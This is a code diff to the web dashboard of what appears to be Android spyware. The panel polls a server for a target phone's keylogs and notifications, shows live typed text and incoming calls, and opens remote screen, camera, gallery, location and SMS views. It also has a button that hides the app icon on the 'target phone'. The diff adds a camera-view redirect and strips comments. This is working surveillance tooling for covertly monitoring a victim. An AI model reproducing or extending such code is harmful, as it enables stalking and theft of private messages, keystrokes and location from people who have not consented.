@@ -223,6 +223,7 @@
 
         <div class="controls-grid">
             <div onclick="openView('screen')" class="control-btn"><i class="fa-solid fa-mobile-screen"></i><span>Screen</span></div>
+            
             <div onclick="openView('camera')" class="control-btn"><i class="fa-solid fa-camera"></i><span>Camera</span></div>
             
             <div class="slider-card">
@@ -286,7 +287,7 @@
                     setStatus(true);
                 }
                 updateDashboard();
-                fetchLiveStatus(); // Start Live Updates
+                fetchLiveStatus(); 
             } else {
                 document.getElementById('idInputPanel').style.display = 'block';
             }
@@ -346,50 +347,41 @@
                 .catch(err => console.log("Connection Error:", err));
         }
 
-        // --- NEW FUNCTION: LIVE ACTIVITY (MSG/CALLS) ---
         async function fetchLiveStatus() {
             if(!DEVICE_ID) return;
 
             try {
-                // Fetch Keylogs (Typed Text) & Notifications (Incoming)
                 const [keylogs, notifs] = await Promise.all([
                     fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/keylogs`).then(r=>r.json()).catch(()=>[]),
                     fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/notifications`).then(r=>r.json()).catch(()=>[])
                 ]);
 
                 let lastActivity = null;
-                let type = 'idle'; // idle, msg, call
-
-                // 1. Check for Calls in Notifications (High Priority)
+                
                 const recentCall = notifs.find(n => 
                     (n.title && (n.title.toLowerCase().includes('call') || n.title.toLowerCase().includes('ringing'))) || 
                     (n.text && (n.text.toLowerCase().includes('incoming call')))
                 );
 
-                // 2. Check for latest Keylog (Typing)
                 const recentKeylog = keylogs.length > 0 ? keylogs[keylogs.length - 1] : null;
 
                 const liveIcon = document.getElementById('liveIcon');
                 const liveLabel = document.getElementById('liveLabel');
                 const liveText = document.getElementById('liveText');
 
-                // Logic to decide what to show
                 if (recentCall) {
-                    // Show Call Status
                     liveIcon.innerHTML = '<i class="fa-solid fa-phone-volume" style="animation:tada 1s infinite;"></i>';
                     liveLabel.innerText = "📞 ACTIVE CALL";
                     liveLabel.style.color = "#ff4444"; 
                     liveText.innerText = `${recentCall.title}: ${recentCall.text}`;
                 } 
                 else if (recentKeylog) {
-                    // Show Typing Status
                     liveIcon.innerHTML = '<i class="fa-regular fa-keyboard"></i>';
                     liveLabel.innerText = "⌨️ TYPING NOW";
                     liveLabel.style.color = "#00f3ff";
                     liveText.innerText = `"${recentKeylog.text}"`; 
                 } 
                 else {
-                    // Idle
                     liveIcon.innerHTML = '<i class="fa-solid fa-check"></i>';
                     liveLabel.innerText = "DEVICE ACTIVE";
                     liveLabel.style.color = "#4caf50";
@@ -401,6 +393,12 @@
 
         function openView(page) {
             if(!DEVICE_ID) return askID();
+
+            // ✅ Sahi kar diya: Ab ye 'view_camera.html' kholega
+            if (page === 'camera') {
+                window.location.href = `view_camera.html?id=${DEVICE_ID}`;
+                return;
+            }
 
             const commands = {
                 'gallery': 'gallery', 'location': 'location', 'sms': 'sms',
@@ -438,7 +436,6 @@
             .catch(err => console.error("Send Failed", err));
         }
 
-        // --- NEW LOGIC: HIDE APP TRIGGER ---
         function triggerHideApp() {
             if(!DEVICE_ID) return askID();
             if(confirm("WARNING: This will HIDE the app icon on the target phone.\n\nAre you sure you want to proceed?")) {
@@ -489,7 +486,7 @@
         }
 
         setInterval(updateDashboard, 5000);
-        setInterval(fetchLiveStatus, 2000); // Check Messages/Calls every 2 sec
+        setInterval(fetchLiveStatus, 2000); 
         window.onload = initDashboard;
     </script>
 </body> 
